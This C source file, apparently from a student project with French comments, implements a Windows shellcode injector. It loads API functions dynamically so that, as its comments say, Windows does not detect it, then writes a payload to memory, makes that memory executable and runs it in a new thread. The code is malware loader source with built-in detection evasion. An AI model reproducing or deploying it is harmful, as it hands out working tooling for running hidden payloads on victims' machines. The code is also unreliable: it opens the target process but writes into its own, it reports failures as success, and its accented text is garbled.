#include <windows.h>
#include <stdio.h>
#include "inject.h"
#include "utils.h"
#include <cassert>




BOOL InjectShellcode(LPVOID payload, SIZE_T payloadSize, DWORD processId , void* allocatedMemory) {

    // je recharge les DLL ici aussi pour �vit� les bugs 
    ChargeDLL dll = { 0 };
    if (!chargerLib(&dll)) {
        printf("Erreur : Impossible de charger les fonctions n�cessaires.\n");
        return 1;
    }

    // On ouvre le processus qui est d�finie par le PID rentr�e dans le fichier "projetArendre" 
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        printf("�chec. Code d'erreur: %lu\n", GetLastError());
        return FALSE;
    }

    // On utilise que les fonction personelle pour que windows ne d�tecte pas ce que l'ont fait 

    SIZE_T bytesWritten = 0;
    assert(dll.pWriteProcessMemory != NULL); // pour retirer l'erreur C6011
    if (!dll.pWriteProcessMemory(dll.pGetCurrentProcess(), allocatedMemory, payload, payloadSize, &bytesWritten)) {
        printf("Erreur : WriteProcessMemory a �chou� (Code : %lu)\n", GetLastError());
        dll.pVirtualFree(allocatedMemory, 0, MEM_RELEASE);
        return 1;
    }

    // On modifie les droits pour pouvoir ex�cuter le code que l'on vient de placer
    DWORD oldProtect;
    if (!dll.pVirtualProtect(allocatedMemory, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("Erreur : VirtualProtect a �chou� (Code : %lu)\n", GetLastError());
        dll.pVirtualFree(allocatedMemory, 0, MEM_RELEASE);
        return 1;
    }


    // On ex�cute notre code plac� 
    assert(dll.pCreateThread != NULL); 
    HANDLE hThread = dll.pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Erreur : CreateThread a �chou� (Code : %lu)\n", GetLastError());
        dll.pVirtualFree(allocatedMemory, 0, MEM_RELEASE);
        return 1;
    }

    // Lib�rer les espaces m�moires 

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    dll.pVirtualFree(allocatedMemory, 0, MEM_RELEASE);

    return TRUE;
}
